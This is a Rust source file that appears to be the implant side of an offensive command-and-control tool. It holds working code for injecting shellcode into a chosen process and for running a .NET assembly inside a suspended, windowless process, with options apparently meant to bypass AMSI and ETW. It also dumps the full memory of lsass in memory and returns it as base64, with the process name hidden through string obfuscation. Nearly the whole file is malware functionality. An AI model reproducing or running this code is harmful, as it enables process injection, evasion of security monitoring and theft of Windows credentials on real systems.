extern crate winapi;

use std::os::windows::process::CommandExt;
use std::time::Duration;
use std::thread;
use std::thread::sleep;
use crate::stdlib::get_wide;

// MiniDumpWriteDump imports
use winapi::{
    ctypes::c_void,
    shared::{
        basetsd::DWORD_PTR,
        ntdef::{HANDLE, HRESULT},
        minwindef::{DWORD, LPVOID},
        winerror::{S_FALSE, S_OK},
    },
    um::{
        heapapi::{GetProcessHeap, HeapAlloc, HeapFree, HeapSize, HeapReAlloc},
        processthreadsapi::OpenProcess,
        psapi::{GetProcessMemoryInfo, PROCESS_MEMORY_COUNTERS},
        winnt::{HEAP_ZERO_MEMORY, RtlCopyMemory, PROCESS_ALL_ACCESS},
    },
};
use std::{
    mem::{drop, forget, MaybeUninit, size_of_val},
    slice::from_raw_parts_mut,
};
use sysinfo::{ProcessExt, System, SystemExt};

pub fn process_injection(args: Vec<&str>) -> String {
    if args.len() < 2 {
        return "please specify PID".to_string()
    }

    let pid = match args[1].parse::<u32>() {
        Err(e)  => return e.to_string(),
        Ok(pid) => pid,
    };
    let shellcode_b64 = args[2];
    let mut shellcode = base64::decode(shellcode_b64).unwrap();
    let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void; 

    // get process handle
    let handle = unsafe {winapi::um::processthreadsapi::OpenProcess(
        winapi::um::winnt::PROCESS_ALL_ACCESS,
        0x01,
        pid
    )};

    // alloc payload
    let addr_shellcode = unsafe {winapi::um::memoryapi::VirtualAllocEx(
        handle,
        std::ptr::null_mut(),
        shellcode.len(),
        winapi::um::winnt::MEM_COMMIT,
        winapi::um::winnt::PAGE_READWRITE
    )};
    let mut ret_len: usize = 0;
    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
        handle,
        addr_shellcode,
        shellcode_ptr,
        shellcode.len(),
        &mut ret_len
    )};

    // protect and execute
    let mut old_protect: u32 = 0;
    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
        handle,
        addr_shellcode,
        shellcode.len(),
        winapi::um::winnt::PAGE_EXECUTE_READ,
        &mut old_protect
    )};
    let _ = unsafe {winapi::um::processthreadsapi::CreateRemoteThreadEx(
        handle,
        std::ptr::null_mut(),
        0,
        std::mem::transmute(addr_shellcode),
        0 as _,
        0,
        std::ptr::null_mut(),
        0 as _
    )};

    "success".to_string()
}

pub fn execute_assembly(args: Vec<&str>) -> String {
    if args.len() < 7 {
        return "".to_string()
    }

    // extract arguments
    let assembly_b64 = args[1];
    let assembly = base64::decode(assembly_b64).unwrap();
    let hosting_dll_b64 = args[2];
    let mut hosting_dll = base64::decode(hosting_dll_b64).unwrap();
    let hosting_dll_ptr: *mut c_void = hosting_dll.as_mut_ptr() as *mut c_void; 
    let process = args[3];
    let amsi = match args[4].parse::<bool>() {
        Err(e)  => return e.to_string(),
        Ok(i) => i,
    };
    let etw = match args[5].parse::<bool>() {
        Err(e)  => return e.to_string(),
        Ok(i) => i,
    };
    let offset_u64 = 0x000010B0;
    let params = args[6..].join(" ");
    let mut output_vec: Vec<String> = Vec::new();
    
    // spawn suspended process
    let cmd = std::process::Command::new(process)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW | winapi::um::winbase::CREATE_SUSPENDED)
        .spawn()
        .unwrap();
    let pid = cmd.id();

    // get output
    let (tx, rx) = std::sync::mpsc::channel::<String>();
    thread::spawn(move || {
        match cmd.wait_with_output() {
            Err(e)      => tx.send(format!("{}", e)).unwrap(),
            Ok(output)  => { tx.send(format!("{}{}", 
                String::from_utf8(output.stdout).unwrap(), 
                String::from_utf8(output.stderr).unwrap()))
                .unwrap()
            },
        };
    });

    // get process handle
    let handle = unsafe {winapi::um::processthreadsapi::OpenProcess(
        winapi::um::winnt::PROCESS_ALL_ACCESS,
        0x01,
        pid
    )};

    // construct assembly payload
    // assembly size:   4 bytes
    // params size:     4 bytes
    // AMSI bool:       1 byte
    // ETW bool:        1 byte
    // parameter bytes
    // assembly bytes
    let mut payload: Vec<u8> = Vec::new();
    // assembly size
    let assembly_len_byte_array: [u8; 4] = unsafe {std::mem::transmute((assembly.len() as u32).to_le())};
    payload.extend_from_slice(&assembly_len_byte_array);
    // params size
    let params_len_byte_array: [u8; 4] = unsafe {std::mem::transmute(((params.len() + 1 as usize) as u32).to_le())};
    payload.extend_from_slice(&params_len_byte_array);
    // AMSI
    if amsi {
        payload.extend_from_slice(&[0x01]);
    } else {
        payload.extend_from_slice(&[0x00]);
    }
    // ETW
    if etw {
        payload.extend_from_slice(&[0x01]);
    } else {
        payload.extend_from_slice(&[0x00]);
    }
    // parameters
    payload.extend_from_slice(params.as_bytes());
    payload.extend_from_slice(&[0x00]);
    payload.extend_from_slice(&assembly);
    let payload_ptr: *mut c_void = payload.as_mut_ptr() as *mut c_void; 

    // alloc HostingCLRx64.dll
    let addr_hosting_dll = unsafe{winapi::um::memoryapi::VirtualAllocEx(
        handle,
        0 as _,
        hosting_dll.len(),
        winapi::um::winnt::MEM_COMMIT,
        winapi::um::winnt::PAGE_READWRITE
    )};
    let mut ret_len: usize = 0;
    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
        handle,
        addr_hosting_dll,
        hosting_dll_ptr,
        hosting_dll.len(),
        &mut ret_len
    )};

    // alloc payload
    let addr_assembly = unsafe{winapi::um::memoryapi::VirtualAllocEx(
        handle,
        std::ptr::null_mut(),
        payload.len(),
        winapi::um::winnt::MEM_COMMIT,
        winapi::um::winnt::PAGE_READWRITE
    )};
    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
        handle,
        addr_assembly,
        payload_ptr,
        payload.len(),
        &mut ret_len
    )};

    // protect and execute
    let mut old_protect: u32 = 0;
    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
        handle,
        addr_hosting_dll,
        hosting_dll.len(),
        winapi::um::winnt::PAGE_EXECUTE_READ,
        &mut old_protect
    )};
    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
        handle,
        addr_assembly,
        payload.len(),
        winapi::um::winnt::PAGE_EXECUTE_READ,
        &mut old_protect
    )};
    let mut lp_thread_id: u32 = 0;
    let thread_start_addr = unsafe { addr_hosting_dll.offset(offset_u64) };
    let thread_handle = unsafe {winapi::um::processthreadsapi::CreateRemoteThreadEx(
        handle,
        std::ptr::null_mut(),
        0,
        std::mem::transmute(thread_start_addr),
        addr_assembly,
        0,
        std::ptr::null_mut(),
        &mut lp_thread_id
    )};

    // wait for thread to finish
    loop {
        let mut ret_code: u32 = 0;
        let _ = unsafe {winapi::um::processthreadsapi::GetExitCodeThread(
            thread_handle,
            &mut ret_code
        )};
        if ret_code == winapi::um::minwinbase::STILL_ACTIVE {
            sleep(Duration::from_secs(1));
        } else {
            let _ = unsafe {winapi::um::processthreadsapi::TerminateProcess(handle, 0)};
            match rx.recv() {
                Ok(output)  => output_vec.push(output),
                Err(_)      => output_vec.push("could not get output".to_string()),
            }
            break
        }
    }

    // close process handle
    let _ = unsafe { winapi::um::handleapi::CloseHandle(handle); };

    output_vec.join("\n")
}

// define enums and structs for MiniDumpWriteDump
#[repr(transparent)]
#[derive(Copy, Clone, Debug, Eq, PartialEq)]
#[allow(non_camel_case_types)]
struct MINIDUMP_CALLBACK_TYPE(pub i32);
#[allow(non_upper_case_globals)]
#[allow(dead_code)]
impl MINIDUMP_CALLBACK_TYPE {
    const ModuleCallback: Self = Self(0);
    const ThreadCallback: Self = Self(1);
    const ThreadExCallback: Self = Self(2);
    const IncludeThreadCallback: Self = Self(3);
    const IncludeModuleCallback: Self = Self(4);
    const MemoryCallback: Self = Self(5);
    const CancelCallback: Self = Self(6);
    const WriteKernelMinidumpCallback: Self = Self(7);
    const KernelMinidumpStatusCallback: Self = Self(8);
    const RemoveMemoryCallback: Self = Self(9);
    const IncludeVmRegionCallback: Self = Self(10);
    const IoStartCallback: Self = Self(11);
    const IoWriteAllCallback: Self = Self(12);
    const IoFinishCallback: Self = Self(13);
    const ReadMemoryFailureCallback: Self = Self(14);
    const SecondaryFlagsCallback: Self = Self(15);
    const IsProcessSnapshotCallback: Self = Self(16);
    const VmStartCallback: Self = Self(17);
    const VmQueryCallback: Self = Self(18);
    const VmPreReadCallback: Self = Self(19);
    const VmPostReadCallback: Self = Self(20);
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_OUTPUT {
    status: HRESULT
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_INPUT {
    process_id: i32,
    process_handle: *mut c_void,
    callback_type: MINIDUMP_CALLBACK_TYPE,
    io: MINIDUMP_IO_CALLBACK,
}

#[allow(dead_code)]
#[allow(non_snake_case)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_INFORMATION<'a> {
    CallbackRoutine: *mut c_void,
    CallbackParam: &'a mut *mut c_void,
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_IO_CALLBACK {
    handle: *mut c_void,
    offset: u64,
    buffer: *mut c_void,
    buffer_bytes: u32
}

#[repr(transparent)]
#[derive(Copy, Clone, Debug, Eq, PartialEq)]
#[allow(non_camel_case_types)]
struct MINIDUMP_TYPE(pub i64);
#[allow(non_upper_case_globals)]
#[allow(dead_code)]
impl MINIDUMP_TYPE {
    const MiniDumpNormal: Self = Self(0);
    const MiniDumpWithDataSegs: Self = Self(1);
    const MiniDumpWithFullMemory: Self = Self(2);
    const MiniDumpWithHandleData: Self = Self(3);
    const MiniDumpFilterMemory: Self = Self(4);
    const MiniDumpScanMemory: Self = Self(5);
    const MiniDumpWithUnloadedModules: Self = Self(6);
    const MiniDumpWithIndirectlyReferencedMemory: Self = Self(7);
    const MiniDumpFilterModulePaths: Self = Self(8);
    const MiniDumpWithProcessThreadData: Self = Self(9);
    const MiniDumpWithPrivateReadWriteMemory: Self = Self(10);
    const MiniDumpWithoutOptionalData: Self = Self(11);
    const MiniDumpWithFullMemoryInfo: Self = Self(12);
    const MiniDumpWithThreadInfo: Self = Self(13);
    const MiniDumpWithCodeSegs: Self = Self(14);
    const MiniDumpWithoutAuxiliaryState: Self = Self(15);
    const MiniDumpWithFullAuxiliaryState: Self = Self(16);
    const MiniDumpWithPrivateWriteCopyMemory: Self = Self(17);
    const MiniDumpIgnoreInaccessibleMemory: Self = Self(18);
    const MiniDumpWithTokenInformation: Self = Self(19);
    const MiniDumpWithModuleHeaders: Self = Self(20);
    const MiniDumpFilterTriage: Self = Self(21);
    const MiniDumpWithAvxXStateContext: Self = Self(22);
    const MiniDumpWithIptTrace: Self = Self(23);
    const MiniDumpScanInaccessiblePartialPages: Self = Self(24);
    const MiniDumpValidTypeFlags: Self = Self(25);
}

#[allow(non_snake_case)]
pub fn minidump_callback_routine(buf: &mut *mut c_void, callbackInput: MINIDUMP_CALLBACK_INPUT, callbackOutput: &mut MINIDUMP_CALLBACK_OUTPUT) -> bool {
    match callbackInput.callback_type {
        MINIDUMP_CALLBACK_TYPE::IoStartCallback => { 
            callbackOutput.status = S_FALSE;
            return true
        },
        MINIDUMP_CALLBACK_TYPE::IoWriteAllCallback => { 
            callbackOutput.status = S_OK;
            let read_buf_size = callbackInput.io.buffer_bytes;
            let current_buf_size = unsafe { HeapSize(
                GetProcessHeap(),
                0 as _,
                *buf
            ) };
            // check if buffer is large enough
            let bytes_and_offset = callbackInput.io.offset as usize + callbackInput.io.buffer_bytes as usize;
            if bytes_and_offset >= current_buf_size {
                // increase heap size
                let size_to_increase = if bytes_and_offset <= (current_buf_size*2) {
                    current_buf_size*2
                } else {
                    bytes_and_offset
                };
                *buf = unsafe { HeapReAlloc(
                    GetProcessHeap(),
                    0 as _,
                    *buf,
                    size_to_increase
                )};
            }

            let source = callbackInput.io.buffer as *mut c_void;
            let destination = (*buf as DWORD_PTR + callbackInput.io.offset as DWORD_PTR) as LPVOID;
            let _ =  unsafe {
                RtlCopyMemory(
                    destination, 
                    source,
                    read_buf_size as usize
                )
            };
            return true
        },
        MINIDUMP_CALLBACK_TYPE::IoFinishCallback => { 
            callbackOutput.status = S_OK;
            return true
        },
        _ => {
            return true
        },
    }
}

pub fn in_memory_dump(args: Vec<&str>) -> String {
    if args.len() < 2 {
        return "".to_string()
    }

    // extract arguments
    let mut pid = match args[1].parse::<u32>() {
        Err(_)  => return "".to_string(),
        Ok(pid) => pid,
    };
    
    #[allow(unused_assignments)]
    let mut handle: HANDLE = 0 as _;

    if pid == 0 {
        // get lsass PID
        let s = System::new_all();
        let lsass = s.get_process_by_name(obfstr::obfstr!("lsass"));
        if lsass.len() > 0 {
            pid = lsass[0].pid() as u32;
        }
        // get lsass process handle
        // TODO get an already used HANDLE to avoid OpenProcess(), try processhacker/ProcessHacker/hndlprv.h
        handle = unsafe { OpenProcess(
            PROCESS_ALL_ACCESS,
            0x01,
            pid
        )};
    } else {
        handle = unsafe { OpenProcess(
            PROCESS_ALL_ACCESS,
            0x01,
            pid
        )};
    }
    
    if handle.is_null() {
        return "could not open PID".to_string()
    }
    
    // https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
    //#[link(name = "dbghelp")]
    let dbghelp_handle = unsafe { winapi::um::libloaderapi::LoadLibraryW(get_wide(obfstr::obfstr!("C:\\Windows\\System32\\dbghelp.dll")).as_ptr()) };
    if dbghelp_handle.is_null() {
        return "".to_string()
    }
    //extern "stdcall" {
    //    pub fn MiniDumpWriteDump(hProcess: HANDLE, processId: DWORD, hFile: HANDLE, dumpType: u64, exceptionParam: *mut c_void, userStreamParam: *mut c_void, callbackParam: *mut MINIDUMP_CALLBACK_INFORMATION) -> bool;
    //}
    let mdwd_func = unsafe { winapi::um::libloaderapi::GetProcAddress(dbghelp_handle, obfstr::obfstr!("MiniDumpWriteDump\0").as_ptr() as _) };
    if mdwd_func.is_null() {
        return "".to_string()
    }

    #[allow(non_snake_case)]
    let MiniDumpWriteDump: unsafe fn(
        HANDLE, 
        DWORD, 
        HANDLE, 
        u64, 
        *mut c_void, 
        *mut c_void, 
        *mut MINIDUMP_CALLBACK_INFORMATION) -> bool = unsafe { std::mem::transmute(mdwd_func as winapi::shared::minwindef::FARPROC) };

    // get lsass size and add padding
    let extra_5mb: usize = 1024*1024 * 5;
    let buf_size: usize;
    let mut pmc = MaybeUninit::<PROCESS_MEMORY_COUNTERS>::uninit();
    let gpm_ret = unsafe { GetProcessMemoryInfo(
        handle,
        pmc.as_mut_ptr(),
        size_of_val(&pmc) as DWORD
    )};
    if gpm_ret != 0 {
        let pmc = unsafe { pmc.assume_init() };
        buf_size = pmc.WorkingSetSize + extra_5mb;
    } else {
        return "".to_string()
    }

    // alloc memory in current process
    let mut buf = unsafe { HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        buf_size
    )};
    forget(buf);

    // set up minidump callback
    let mut callback_info = MINIDUMP_CALLBACK_INFORMATION {
        CallbackRoutine: minidump_callback_routine as _,
        CallbackParam: &mut buf,
    };
    let _ = unsafe { MiniDumpWriteDump(
        handle, 
        pid, 
        0 as _, 
        0x00000002,//MINIDUMP_TYPE::MiniDumpWithFullMemory,
        0 as _, 
        0 as _, 
        &mut callback_info
    )};
    let _ = unsafe { winapi::um::libloaderapi::FreeLibrary(dbghelp_handle) };

    // base64
    let buf_slice: &mut [u8] = unsafe { from_raw_parts_mut(buf as _, buf_size) };
    let buf_b64 = base64::encode(buf_slice);
    
    // drop allocated memory
    let _ = unsafe { HeapFree(
        GetProcessHeap(),
        0 as _,
        buf
    )};
    drop(buf);

    return buf_b64
}
